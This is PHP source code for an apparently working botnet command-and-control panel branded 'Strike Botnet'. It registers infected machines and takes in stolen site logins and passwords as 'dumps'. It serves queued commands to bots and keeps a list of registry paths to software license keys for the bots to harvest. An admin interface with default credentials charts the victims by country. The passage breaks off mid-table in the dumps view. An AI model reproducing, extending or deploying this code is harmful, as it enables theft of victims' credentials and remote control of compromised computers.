,"HKEY_LOCAL_MACHINE\\SOFTWARE\\BillP Studios\\WinPatrol\\RegNumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Ipswitch\\WS_FTP\\SerialNumber" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Zone Labs\\ZoneAlarm\\Registration\\RegisteredOwner" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Zone Labs\\ZoneAlarm\\Registration\\RegisteredOrganization" ,"HKEY_LOCAL_MACHINE\\SOFTWARE\\Zone Labs\\ZoneAlarm\\Registration\\SerialNum");


//-------------------------------------------------------------------------------------------
include ("showflag.php");
//-------------------------------------------------------------------------------------------
	function connect_database() {
		global $dbHost, $dbUser, $dbPass, $dbDatabase, $html, $header, $footer;
		$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
		if (!$mysql) {
			$html = "Database Error";
			die($html);
		}
		if (!mysql_select_db($dbDatabase, $mysql)) {
			mysql_close($mysql);
			$html = "Database Error";
			die($html);
		}
		return $mysql;
	}
	function get_all($name){
		$mysql = connect_database();
		$result = mysql_query("SELECT COUNT(*) AS listcount FROM `".$name."`;", $mysql);
		if ($result){
			$data = mysql_fetch_assoc($result);
			echo mysql_error(); 
			return $data['listcount'];
		}else{
			return 0;
		}
	}
	function get_onlineusers(){
		$mysql = connect_database();
		$timeoutseconds = 600;
		$timestamp=time();
		$timeout=$timestamp-$timeoutseconds;
		$ips = substr($_SERVER['REMOTE_ADDR'], 0, strrpos($_SERVER['REMOTE_ADDR'],"."));

		@mysql_query("DELETE FROM useronline WHERE timestamp<". $timeout);

		$result = @mysql_query("SELECT DISTINCT ip FROM useronline");
		$user = @mysql_num_rows($result);
		return $user;
	}

	function Encrypt($string)
	{
   	$Password   = "squeezer";
	  for($i=0; $i<strlen($string); $i++)
	  {
	    for($j=0; $j<strlen($Password); $j++)
	    {
	      $string[$i] = $string[$i]^$Password[$j];
	    }
	  }
	  return UrlEncode($string);
	}

	function Decrypt($string)
	{
	$Password   = "squeezer";
	  $string = UrlDecode($string);
	  for($i=0; $i<strlen($string); $i++)
	  {
	    for($j=0; $j<strlen($Password); $j++)
	    {
	      $string[$i] = $Password[$j]^$string[$i];
	    }
	  }
	  return $string;
	}
//-------------------------------------------------------------------------------------------
if (isset($_GET["action"])){
	if ($_GET["action"] == "enc") {
		echo Encrypt($_GET["enc"]);
	}
	if ($_GET["action"] == "add") {
		if (isset($_GET["p"]) && isset($_GET["v"])) {
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;
			$result = mysql_query("SELECT * FROM `bots` WHERE `version` = '".mysql_real_escape_string(htmlspecialchars(UrlDecode($_GET["v"])))."' AND `ip` = '".$_SERVER['REMOTE_ADDR']."' AND `pc` = '".mysql_real_escape_string(htmlspecialchars(UrlDecode($_GET["p"])))."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$Arr = GetCountryNameById(GetGountryIdByIp($_SERVER['REMOTE_ADDR']));
				$result = mysql_query("INSERT INTO `bots` (`id`, `version`, `pc`, `ip`, `country`, `date`) VALUES (NULL , '".mysql_real_escape_string(htmlspecialchars(UrlDecode($_GET["v"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(UrlDecode($_GET["p"])), $mysql)."', '".$_SERVER['REMOTE_ADDR']."', '".$Arr[0]."', '".date("Y-m-d H:i:s")."');", $mysql);
			}
			mysql_close($mysql);
		}
		exit;
	}
	if ($_GET["action"] == "dump") {
		if (isset($_GET["u"]) && isset($_GET["l"]) && isset($_GET["p"]) && isset($_GET["n"])) {
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) exit;
			$result = mysql_query("SELECT * FROM `dumps` WHERE `url` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])))."' AND `login` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])))."' AND `pass` = '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])))."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO `dumps` (`id`, `program`, `url`, `login`, `pass`, `date`, `ip`) VALUES (NULL , '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["n"])), $mysql)."', '".
				mysql_real_escape_string(htmlspecialchars(urldecode($_GET["u"])), $mysql)."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["l"])), $mysql)."', '".mysql_real_escape_string(htmlspecialchars(urldecode($_GET["p"])), $mysql)."', '".date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."');", $mysql);
			}
			mysql_close($mysql);
		}
		exit;
	}
	if ($_GET["action"] == "getcomm") {
			$commandlist = "";
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) {
				mysql_close($mysql);
			}
			$result = mysql_query("SELECT * FROM `commands` WHERE 1", $mysql);
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$commandlist .= $row["command"] . "!";
				$i++;
			}
			print $commandlist;

		connect_database();
		$timeoutseconds = 600;
		$timestamp=time();
		$timeout=$timestamp-$timeoutseconds;
		$ips = substr($_SERVER['REMOTE_ADDR'], 0, strrpos($_SERVER['REMOTE_ADDR'],"."));

		$loopcap = 0;
		while($loopcap<3 && @mysql_query("INSERT INTO useronline VALUES('". $timestamp ."','". $ips ."','". $_SERVER['PHP_SELF'] ."')"))
		{
		    $timestamp = $timestamp+$ips{0}; $loopcap++;
		}

		@mysql_query("DELETE FROM useronline WHERE timestamp<". $timeout);



			mysql_close($mysql);
	exit;
	}
	if ($_GET["action"] == "getkeys") {
			$commandlist = "";
			$mysql = mysql_connect($dbHost, $dbUser, $dbPass);
			if (!$mysql) exit;
			if (!mysql_select_db($dbDatabase, $mysql)) {
				mysql_close($mysql);
			}
			$result = mysql_query("SELECT * FROM `keys` WHERE 1", $mysql);
			$i = 0;
			while ($row = mysql_fetch_array($result)) {
				$commandlist .= $row["program"];
				$commandlist .= ":- ";
				$commandlist .= $row["path"];
				$commandlist .= "---";
				$i++;
			}
			header("Content-Length: ".strlen($commandlist));
			print $commandlist;
			mysql_close($mysql);
	exit;
	}
}
//-------------------------------------------------------------------------------------------
$mysql = connect_database();
$result = mysql_query("SELECT COUNT(*) FROM `admin`;", $mysql);
if (!$result) {
	$result = mysql_query("CREATE TABLE `admin` (`username` VARCHAR(150) NOT NULL, `password` VARCHAR(150) NOT NULL, `rpp` INT NOT NULL);", $mysql);
	if (!$result) {
		$html = "Database Error";
		die($html);
	}else{
		$result = mysql_query("INSERT INTO `admin` (`username`, `password`, `rpp`) VALUES ('Strike' , 'Strike' , 10);", $mysql);
	}
}
$query  = "SELECT * FROM `admin`";
$result = mysql_query($query);

$row = mysql_fetch_array($result, MYSQL_ASSOC);

session_start();
if(isset($_POST['userlogin']))
{
    $user = strip_tags($_POST['username']) ;
    $pass = $_POST['password'] ;
    if ($user == $row['username'] && $pass == $row['password'])
   	{
        $_SESSION["ip"] = $_SERVER["REMOTE_ADDR"];
        $_SESSION["Username"] = $row["username"];
	$_SESSION["Password"] = $row["password"];
	$_SESSION["rpp"] = $row["rpp"];
	header( "location: ?admin=bots&page=1" );
    }
    else
    	// login/pass check failed
    	{
           exit;
    	}
}
if (isset($_SESSION["Username"])){}else{$_SESSION["Username"] = "";}
if ($_SESSION["Username"]!=$row['username'] || $_SESSION["ip"]!=$_SERVER["REMOTE_ADDR"]) {
	echo $loginform;
exit;
}
//-------------------------------------------------------------------------------------------

if (isset($_GET["admin"])){
	$result = mysql_query("SELECT COUNT(*) FROM `bots`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE `bots` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `version` VARCHAR(150) NOT NULL, `pc` VARCHAR(150) NOT NULL, `ip` VARCHAR(150) NOT NULL, `country` VARCHAR(150) NOT NULL, `date` DATETIME NOT NULL);", $mysql);
		if (!$result) {
			$html = "Database Error";
			die($html);
		}
	}
	$result = mysql_query("SELECT COUNT(*) FROM `commands`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE `commands` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `command` VARCHAR(150) NOT NULL, `date` DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
		if (!$result) {
			$html = "Database Error";
			die($html);
		}
	}
	$result = mysql_query("SELECT COUNT(*) FROM `useronline`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE useronline (timestamp int(15) DEFAULT '0' NOT NULL,ip varchar(40) NOT NULL,file varchar(100) NOT NULL,PRIMARY KEY (timestamp),KEY ip (ip),KEY file (file));", $mysql);
		if (!$result) {
			$html = "Database Error";
			die($html);
		}
	}
	if (!$result) {
		$result = mysql_query("CREATE TABLE `dumps` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` VARCHAR(150) NOT NULL, `url` 
					VARCHAR(150) NOT NULL, `login` VARCHAR(50) NOT NULL, `pass` VARCHAR(50) NOT NULL, `date` 
					DATETIME NOT NULL, `ip` VARCHAR(15) NOT NULL);", $mysql);
		if (!$result) {
			$html = "Database Error";
			die($html);
		}
	}
	$result = mysql_query("SELECT COUNT(*) FROM `keys`;", $mysql);
	if (!$result) {
		$result = mysql_query("CREATE TABLE `keys` (`id` INT NOT NULL AUTO_INCREMENT PRIMARY KEY, `program` VARCHAR(150) NOT NULL, `path` VARCHAR(150) NOT NULL);", $mysql);
		if (!$result) {
			$html .= "Database Error".$header."Can not create table 'logs', please check the configuration and your priviledges.".$footer;
			die($html);
		}else{
			$count = count($kprograms);
			for ($i = 0; $i < $count; $i++) {
                            	mysql_query("INSERT INTO `keys` (`id`, `program`, `path`) VALUES (NULL,'". mysql_real_escape_string($kprograms["$i"]) ."' ,'". mysql_real_escape_string($kpaths["$i"]) ."');",$mysql);
			}

		}
	}
	$html = "
            <!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
            <html xmlns='http://www.w3.org/1999/xhtml'>
            <head>
            <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
            <title>Strike Botnet - SqUeEzEr</title>
            <style type='text/css'>
            <!--
            @import url('style.css');
            -->
            </style>
	    <script type='text/javascript' src='unitip.js'></script>
	    <!--[if lt IE 7]>
	    <script type='text/javascript' src='unitpngfix.js'></script>
    	    <style type='text/css'>
            .clearfix {height:1px;}
    	    </style>
	    <![endif]-->
            </head>
            <body>
            <div id='div-style' align='center'>";
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "logout") {
		unset($_SESSION["Username"]);
		unset($_SESSION["ip"]);
		session_unset();
		header("Location: index.php");
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "settings") {

		if (isset($_POST["u"]) && isset($_POST["p"]) && isset($_POST["r"])) {
			if (!$mysql) exit;
			$result = mysql_query("DELETE FROM `admin` WHERE `username` = '".$_SESSION["Username"]."';", $mysql);
			$result = mysql_query("INSERT INTO `admin` (`username`, `password`, `rpp`) VALUES ('".$_POST["u"]."' , '".$_POST["p"]."' , ".$_POST["r"].");", $mysql);
			$_SESSION["Username"] = $_POST["u"];
			$_SESSION["Password"] = $_POST["p"];
			$_SESSION["rpp"] = $_POST["r"];
		}

		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		$html .="<table id='gradient-style' summary='Dumps'>
                		<tfoot>
                    		<tr>
                        		<td colspan='5'>Copyright SqUeEzEr 2010</td>
				</tr>
                		</tfoot><tbody>
				<tr><form name='command' method='POST' action='?admin=settings'>
				<td>Username:</td><td><input type='text' name='u' size='20' value='".$_SESSION["Username"]."'></td><td colspan='3'></td></tr><tr>
				<td>Password:</td><td><input type='password' name='p' size='20' value='".$_SESSION["Password"]."'></td><td colspan='3'></td></tr><tr>
				<td>Results per page:</td><td><input type='number' name='r' size='20' value='".$_SESSION["rpp"]."'><input type='image' src='images/accept.png' id='button'></td><td colspan='3'></td>
				</form></tr>
				</tbody>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "stats") {

	$html = "
            <!DOCTYPE html PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN' 'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'>
            <html xmlns='http://www.w3.org/1999/xhtml'>
            <head>
            <meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
            <title>Strike Botnet - SqUeEzEr</title><style type='text/css'><!--@import url('style.css');--></style><script type='text/javascript' src='unitip.js'></script><!--[if lt IE 7]><script type='text/javascript' src='unitpngfix.js'></script><style type='text/css'>.clearfix {height:1px;}</style><![endif]-->
	    <script type='text/javascript' src='jquery.min.js'></script>
		
	    <script type='text/javascript' src='highcharts.js'></script>
		
	    <!--[if IE]>
<script type='text/javascript' src='excanvas.compiled.js'></script>
		
	    <![endif]-->

		
	    <script type='text/javascript'>
		
	    $(document).ready(function() {
var chart = new Highcharts.Chart({chart: {renderTo: 'container',margin: [20, 200, 30, 170]},title: {text: 'Bots percentage by country'},plotArea: {shadow: null,borderWidth: null,backgroundColor: null},tooltip: {formatter: function() {return '<b>'+ this.point.name +'</b>: '+ this.y +' %';}},plotOptions: {pie: {allowPointSelect: true,dataLabels: {enabled: true,formatter: function() {if (this.y > 5) return this.point.name;},color: 'white',style: {font: '13px Trebuchet MS, Verdana, sans-serif'}}}},legend: {layout: 'vertical',style: {left: 'auto',bottom: 'auto',right: '50px',top: '100px'}},series: [{type: 'pie',name: 'Browser share',data: [";

		$AllBots = get_all("bots");
		if ($AllBots > 0){
		for ($i = 0; $i < count($GEOIP_COUNTRY_NAMES); $i++) {
			$result = mysql_query("SELECT COUNT(*) AS botcount FROM `bots` WHERE country = '".$GEOIP_COUNTRY_NAMES[$i]."';", $mysql);
			if ($result){
				$data = mysql_fetch_assoc($result);
				//if ($data['botcount'] > ($AllBots/10)){	
				if ($data['botcount'] > 0){		
					$html .= "['".$GEOIP_COUNTRY_NAMES[$i]."',".ceil(($data['botcount']/$AllBots)*100)."],";
				}
			}
		}
		}
		$html = substr($html, 0, -1);
		$html .= "]}]});});</script>
</head><body><div id='div-style' align='center'>";
		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		$html .="<table id='gradient-style' summary='Dumps'>
                		<tfoot>
                    		<tr>
                        		<td colspan='6'>Copyright SqUeEzEr 2010</td>
				</tr>
                		</tfoot><tbody>
				<tr><td colspan='6'><div id='container' style='height: 300px; margin: 0 auto'></td></tr>
				</tbody>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "commands") {
		
		if (isset($_POST["q"])) {
			if (!$mysql) exit;
			$result = mysql_query("SELECT * FROM `commands` WHERE `command` = '".$_POST["q"]."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO `commands` (`id`, `command`, `ip`, `date`) VALUES (NULL , '".
				$_POST["q"]."', '".$_SERVER['REMOTE_ADDR']."','".date("Y-m-d H:i:s")."');", $mysql);
			}
		}

		$result = mysql_query("SELECT COUNT(*) FROM `commands`;", $mysql);
		$logstotal = mysql_result($result, 0);
		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/(int)$_SESSION["rpp"])){
				$html .="<table id='gradient-style' summary='Dumps'>
					<thead>
                    			<tr>
                        			<th scope='col'><img src='images/vcard.png'/>ID</th>
                        			<th scope='col'><img src='images/tag_blue_edit.png'/>Command</th>
                        			<th scope='col'><img src='images/world.png'/>Country</th>
                        			<th scope='col'>IP</th>
                        			<th scope='col'><img src='images/date.png'/>Time stamp</th>
						<th scope='col'></th>
                    			</tr>
                			</thead>
                			<tfoot>
                    			<tr><td colspan='6'>Page ". $_GET["page"] ." of ".ceil($logstotal/(int)$_SESSION["rpp"])." from about ".$logstotal." Results.    <img src='images/page_copy.png'/>";
				for ($i = ($_GET["page"]-3); $i < $_GET["page"]; $i++) {
                            		if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=commands&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "<b>". $_GET["page"] ."</b>, ";
				for ($i = ($_GET["page"]+1); $i < ($_GET["page"]+4); $i++) {
					if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=commands&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "</tr></tfoot><tbody>";
				$result = mysql_query("SELECT * FROM `commands` LIMIT ".(($_GET["page"]-1)*(int)$_SESSION["rpp"])." , ".(int)$_SESSION["rpp"].";", $mysql);
				if (!$result) die(mysql_error());
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$Arr = GetCountryNameById(GetGountryIdByIp($row["ip"]));
					$html .= "<tr>";
                        		$html .= "<td>".$row["id"]."</td>";
                        		$html .= "<td>".$row["command"]."</td>";
                        		$html .= "<td><img src='showflag.php?ip=". $row["ip"] ."'/> ".$Arr[0];
					$html .= "</td>";
                        		$html .= "<td>".$row["ip"]."</td>";
                        		$html .= "<td>".$row["date"]."</td>";
                        		$html .= "<td><a href='?admin=delete&table=commands&sel=".$row["id"]."'><img src='images/bin_empty.png'/></a></td>";
                    			$html .= "</tr>";
					$i++;
				}
			}
		} else {
			$html .="<table id='gradient-style' summary='Commands'><thead><tr>
                        	<th scope='col'><img src='images/vcard.png'/>ID</th>
                        	<th scope='col'><img src='images/tag_blue_edit.png'/>Command</th>
                        	<th scope='col'><img src='images/world.png'/>Country</th>
                        	<th scope='col'>IP</th>
                        	<th scope='col'><img src='images/date.png'/>Time stamp</th>
                    	</tr></thead><tfoot><tr><td colspan='5'>There are NO commands to display</td></tr>";
		}
		$html .= "<tr><form name='command' method='POST' action='?admin=commands&page=1'><td colspan='6'>Add Command: <input type='text' name='q' size='20'><input type='image' src='images/add.png' id='button'></td></form></tr>";
		$html .= "</tbody></table>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "keys") {

		if (isset($_POST["q"]) && isset($_POST["p"])) {
			if (!$mysql) exit;
			$result = mysql_query("SELECT * FROM `keys` WHERE `program` = '".$_POST["p"]."';", $mysql);
			if (!$result) exit;
			if (mysql_num_rows($result) == 0) {
				$result = mysql_query("INSERT INTO `keys` (`id`, `program`, `path`) VALUES (NULL , '".
				$_POST["p"]."', '".$_POST["q"]."');", $mysql);
			}
		}

		$result = mysql_query("SELECT COUNT(*) FROM `keys`;", $mysql);
		$logstotal = mysql_result($result, 0);
		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/(int)$_SESSION["rpp"])){
				$html .="<table id='gradient-style' summary='Dumps'>
					<thead>
                    			<tr>
                        			<th scope='col'><img src='images/vcard.png'/>ID</th>
                        			<th scope='col'><img src='images/page_white_office.png'/>Program</th>
                        			<th scope='col'><img src='images/folder.png'/>Path</th>
						<th scope='col'></th>
                    			</tr>
                			</thead>
                			<tfoot>
                    			<tr><td colspan='4'>Page ". $_GET["page"] ." of ".ceil($logstotal/(int)$_SESSION["rpp"])." from about ".$logstotal." Results.    <img src='images/page_copy.png'/>";
				for ($i = ($_GET["page"]-3); $i < $_GET["page"]; $i++) {
                            		if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=keys&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "<b>". $_GET["page"] ."</b>, ";
				for ($i = ($_GET["page"]+1); $i < ($_GET["page"]+4); $i++) {
					if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=keys&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "</tr></tfoot><tbody>";
				$result = mysql_query("SELECT * FROM `keys` LIMIT ".(($_GET["page"]-1)*(int)$_SESSION["rpp"])." , ".(int)$_SESSION["rpp"].";", $mysql);
				if (!$result) die(mysql_error());
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$html .= "<tr>";
                        		$html .= "<td>".$row["id"]."</td>";
                        		$html .= "<td>".$row["program"]."</td>";
                        		$html .= "<td>".$row["path"]."</td>";
                        		$html .= "<td><a href='?admin=delete&table=keys&sel=".$row["id"]."'><img src='images/bin_empty.png'/></a></td>";
                    			$html .= "</tr>";
					$i++;
				}
			
			}
		} else {
			$html .="<table id='gradient-style' summary='Commands'><thead><tr>
                        	<th scope='col'><img src='images/vcard.png'/>ID</th>
                        	<th scope='col'><img src='images/page_white_office.png'/>Program</th>
                        	<th scope='col'><img src='images/folder.png'/>Path</th>
				<th scope='col'></th>
                    	</tr></thead><tfoot><tr><td colspan='4'>There are NO keys to display</td></tr>";
		}
		$html .= "<tr><form name='keys' method='POST' action='?admin=keys&page=1'><td colspan='6'>Add Program: <input type='text' name='p' size='20'> Path: <input type='text' name='q' size='20'><input type='image' src='images/add.png' id='button'></td></form></tr>";
		$html .= "</tbody></table>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "bots") {

		$result = mysql_query("SELECT COUNT(*) FROM `bots`;", $mysql);
		$logstotal = mysql_result($result, 0);
		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/(int)$_SESSION["rpp"])){
				$html .="<table id='gradient-style' summary='Dumps'>
                			<thead>
                    			<tr>
                        			<th scope='col'><img src='images/vcard.png'/>ID</th>
                        			<th scope='col'><img src='images/award_star_gold_3.png'/>Ver</th>
                        			<th scope='col'><img src='images/computer.png'/>Pc Name</th>
                        			<th scope='col'><img src='images/world.png'/>Country</th>
                        			<th scope='col'>IP</th>
                        			<th scope='col'><img src='images/date.png'/>First time</th>
						<th scope='col'></th>
                    			</tr>
                			</thead>
                			<tfoot>
                    			<tr><td colspan='7'>Page ". $_GET["page"] ." of ".ceil($logstotal/(int)$_SESSION["rpp"])." from about ".$logstotal." Results.    <img src='images/page_copy.png'/>";
				for ($i = ($_GET["page"]-3); $i < $_GET["page"]; $i++) {
                            		if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=bots&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "<b>". $_GET["page"] ."</b>, ";
				for ($i = ($_GET["page"]+1); $i < ($_GET["page"]+4); $i++) {
					if (($i > 0) && ($i <= ceil($logstotal/(int)$_SESSION["rpp"]))){$html .= "<a href='?admin=bots&page=".$i."' id='page'> ".$i.", </a>";}
				}
				$html .= "</tr></tfoot><tbody>";
				$result = mysql_query("SELECT * FROM `bots` LIMIT ".(($_GET["page"]-1)*(int)$_SESSION["rpp"])." , ".(int)$_SESSION["rpp"].";", $mysql);
				if (!$result) die(mysql_error());
				$i = 0;
				while ($row = mysql_fetch_array($result)) {
					$dumps = mysql_query("SELECT COUNT(*) FROM `dumps` WHERE `ip` ='".$row["ip"]."';", $mysql);
					$dumps = mysql_result($dumps, 0);
                    			$html .= "<a class='right tip' href='#' title='<font size=2><img src=";
					$html .= '"images/key.png"';
					$html .= "/>Dumps:".$dumps."</font>'>";
                    			$html .= "<tr>";
                        		$html .= "<td>".$row["id"]."</td>";
                        		$html .= "<td>".$row["version"]."</td>";
                        		$html .= "<td>".$row["pc"]."</td>";
                        		$html .= "<td><img src='showflag.php?ip=". $row["ip"] ."'/> ".$row["country"];
					$html .= "</td>";
                        		$html .= "<td>".$row["ip"]."</td>";
                        		$html .= "<td>".$row["date"]."</td>";
                        		$html .= "<td><a href='?admin=delete&table=bots&sel=".$row["id"]."'><img src='images/bin_empty.png'/></a></td>";
                    			$html .= "</tr></a>";
					$i++;
				}
			
			}
		} else {
			$html .="<table id='gradient-style' summary='Bots'><thead><tr>
                        	<th scope='col'><img src='images/vcard.png'/>ID</th>
                        	<th scope='col'><img src='images/award_star_gold_3.png'/>Ver</th>
                        	<th scope='col'><img src='images/computer.png'/>Pc Name</th>
                        	<th scope='col'><img src='images/world.png'/>Country</th>
                        	<th scope='col'>IP</th>
                        	<th scope='col'><img src='images/date.png'/>First time</th>
                    	</tr></thead><tfoot><tr><td colspan='6'>There are NO bots to display</td></tr>";
		}
		$html .= "</tbody></table>";
	}
//-------------------------------------------------------------------------------------------
	if ($_GET["admin"] == "dumps") {

		$result = mysql_query("SELECT COUNT(*) FROM `dumps`;", $mysql);
		$logstotal = mysql_result($result, 0);
		$html .= "<table id='gradient-style' summary='Dumps'>
                			<thead>
  					<th scope='col' id='th-menu'><A href='index.php?admin=bots&page=1'>Bots</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=commands&page=1'>Commands</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=dumps&page=1'>Dumps</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=keys&page=1'>Key List</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=settings'>Settings</A> </th>
					<th scope='col' id='th-menu'><A href='index.php?admin=stats'>Stats</A> </th>
  					<th scope='col' id='th-menu'><A href='index.php?admin=logout'>Log Out</A> </th>
					</thead>
				</table><img src='images/Logo.png'/>";
		if ($logstotal > 0) {
			if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($logstotal/(int)$_SESSION["rpp"])){
				$html .="<table id='gradient-style' summary='Dumps'>
                			<thead>
                    			<tr>
                        			<th scope='col'><img src='images/vcard.png'/>ID</th>
                        			<th scope='col'><img src='images/page_white_office.png'/>Program</th>
                        			<th scope='col'><img src='images/transmit.png'/>Url</th>
                        			<th scope='col'><img src='images/user_gray.png'/>Username</th>
                        			<th scope='col'><img src='images/shield.png'/>Password</th>
                        			<th scope='col'><img src='images/date.png'/>Date</th>
						<th scope='col'>Ip</th>
  						<th scope='col'></th>
                    			</tr>
                			</thead>
                			<tfoot>
